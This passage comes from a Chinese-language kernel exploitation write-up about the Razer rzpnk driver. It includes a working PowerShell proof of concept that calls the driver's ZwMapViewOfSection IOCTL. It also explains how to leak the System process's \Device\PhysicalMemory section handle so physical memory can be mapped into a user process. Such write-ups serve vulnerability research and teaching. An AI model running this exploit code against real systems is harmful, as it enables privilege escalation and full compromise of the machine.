
```powershell
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
public static class Razer
{
[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
public static extern IntPtr CreateFile(
String lpFileName,
UInt32 dwDesiredAccess,
UInt32 dwShareMode,
IntPtr lpSecurityAttributes,
UInt32 dwCreationDisposition,
UInt32 dwFlagsAndAttributes,
IntPtr hTemplateFile);
[DllImport("Kernel32.dll", SetLastError = true)]
public static extern bool DeviceIoControl(
IntPtr hDevice,
int IoControlCode,
byte[] InBuffer,
int nInBufferSize,
IntPtr OutBuffer,
int nOutBufferSize,
ref int pBytesReturned,
IntPtr Overlapped);
[DllImport("kernel32.dll", SetLastError = true)]
public static extern IntPtr VirtualAlloc(
IntPtr lpAddress,
uint dwSize,
UInt32 flAllocationType,
UInt32 flProtect);
}
"@
#----------------[Get Driver Handle]
$hDevice = [Razer]::CreateFile("\\.\47CD78C9-64C3-47C2-B80F-677B887CF095", [System.IO.FileAccess]::ReadWrite,
[System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)
if ($hDevice -eq -1) {
echo "`n[!] Unable to get driver handle..`n"
Return
} else {
echo "`n[>] Driver access OK.."
echo "[+] lpFileName: \\.\47CD78C9-64C3-47C2-B80F-677B887CF095 => rzpnk"
echo "[+] Handle: $hDevice"
}
#----------------[Prepare buffer & Send IOCTL]
# Input buffer
$InBuffer = @(
[System.BitConverter]::GetBytes([Int64]0xAAAAAA) +
[System.BitConverter]::GetBytes([Int64]0xBBBBBB) +
[System.BitConverter]::GetBytes([Int64]0xCCCCCC) +
[System.BitConverter]::GetBytes([Int64]0xDDDDDD) +
[System.BitConverter]::GetBytes([Int64]0xEEEEEE) +
[System.BitConverter]::GetBytes([Int64]0xFFFFFF)
)
# Output buffer
$OutBuffer = [Razer]::VirtualAlloc([System.IntPtr]::Zero, 1024, 0x3000, 0x40)
# Ptr receiving output byte count
$IntRet = 0
#=======
# 0x22A064 - ZwMapViewOfSection
#=======
$CallResult = [Razer]::DeviceIoControl($hDevice, 0x22A064, $InBuffer, $InBuffer.Length, $OutBuffer, 1024, [ref]$IntRet, [System.IntPtr]::Zero)
if (!$CallResult) {
echo "`n[!] DeviceIoControl failed..`n"
Return
}
#----------------[Read out the result buffer]
echo "`n[>] Call result:"
"{0:X}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($OutBuffer.ToInt64())) # 0x30 pyramid scheme ;)
"{0:X}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($OutBuffer.ToInt64()+8))
"{0:X}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($OutBuffer.ToInt64()+8+8))
"{0:X}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($OutBuffer.ToInt64()+8+8+8))
"{0:X}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($OutBuffer.ToInt64()+8+8+8+8))
"{0:X}" -f $([System.Runtime.InteropServices.Marshal]::ReadInt64($OutBuffer.ToInt64()+8+8+8+8+8))
```

在做调试之前，我们先运行POc并看看驱动返回了什么。

![](upload/attach/201803/530966_PTHH248RFAK56A5.jpg)

很好，附加了一串输入参数后我们可以看到Int64返回了0，低序DWORD返回了`NTSTATUS code`。这种情况下，`ZwMapViewOfSection`返回了`STATUS_INVALID_HANDLE`，它表示函数期望一个区段句柄作为第一个参数，而我们却填充了一些垃圾值。另一方面的影响在于我们可以通过对比`NTSTATUS`码`0x0`（`STATUS_SUCCESS`）来鉴别调用是否成功。

图中可以看到我们已经知道了一些静态参数的值，为了消除疑惑我们在调用`ZwMapViewOfSection`调用处下个断点，检查寄存器和堆栈。`ZwMapViewOfSection`使用`stdcall`标准，因此，参数会被存储在`RCX`,`RDX`,`R8`,`R9`以及栈上。

![](upload/attach/201803/530966_4XVE8E3633FZYY5.jpg)

把这些全部放在我们的输入参数中，得到下面的内容。

```
NTSTATUS ZwMapViewOfSection(
_In_ HANDLE SectionHandle, | Param 3 - RCX = SectionHandle
_In_ HANDLE ProcessHandle, | Param 1 - RDX = ProcessHandle
_Inout_ PVOID *BaseAddress, | Param 2 - R8 = BaseAddress -> Irrelevant, ptr to NULL
_In_ ULONG_PTR ZeroBits, | 0 -> OK - R9
_In_ SIZE_T CommitSize, | Param 5 - CommitSize / ViewSize
_Inout_opt_ PLARGE_INTEGER SectionOffset, | 0 -> OK
_Inout_ PSIZE_T ViewSize, | Param 5 - CommitSize / ViewSize
_In_ SECTION_INHERIT InheritDisposition, | 2 = ViewUnmap
_In_ ULONG AllocationType, | 0 -> Undocumented?
_In_ ULONG Win32Protect | 0x40 -> PAGE_READWRITE
);
```

这里我们大部分能控制的都很直接。进程句柄的话我们仅仅需要传递一个到`Powershell`有完整权限的句柄，提交尺寸/视图尺寸则很简单，就是我们映射到进程的大小。但还是有个问题，我们要如何得到一个区段句柄，驱动并没有任何的函数允许我们去调用`ZwCreateSection`或`ZwOpenSection`。

### Leaking Physical Memory

在这一点上我甚是迷惑，由于我无法创建一个区段句柄，exp也就到此为止了。幸运的是`@aionescu`给了我一些灵感。使用`NtQuerySystemInformation`并携带`SystemHandleInformation`类别参数我们可以泄露出系统上通过进程打开的所有句柄。这些句柄是每-进程用户空间句柄，然而，`System`进程(`PID=4`)是一个特殊的例子，它允许我们转换用户空间句柄成内核句柄！

我为什么要关心这些？实际上`System`有一个到`"\Device\PhysicalMemory"`的句柄，如果我们可以泄露出该句柄的话，就可以利用`ZwMapViewOfSection`来直接映射物理内存到我们的`PowerShel`进程了！

![](upload/attach/201803/530966_RPJYXQ76PSUUJ3Z.jpg)

我写了一个`powershell`函数来实现这个功能。它使用静态的句柄常量来判断进程打开的句柄类型。我近期更新了这个函数，它现在可以在`Win 7`到`Win 10 RS2`上工作。`Get-Handles`是我`GitHub`上的`PSKernel-Primitives` repo的一部分，如果你想要利用`PowerShell`做内核`pwn`的话，可以使用它。

![](upload/attach/201803/530966_4PVZ9B4WG474RRG.jpg)

获取内核句柄所需要做的就是把一个静态值与`0x204`（64位：`0xffffffff80000000`，32位：`0x80000000`）做加法运算。我们可以动态的做这件事。

```powershell
$SystemProcHandles = Get-Handles -ProcID 4
[Int]$UserSectionHandle = $(($SystemProcHandles |Where-Object {$\_.ObjectType -eq "Section"}).Handle)
[Int64]$SystemSectionHandle = $UserSectionHandle + 0xffffffff80000000
```

现在我们可以把所有东西整合一下，写一个新`POC`。为了测试起见，我们尝试去映射`1mb`的物理内存到`PowerShell`。
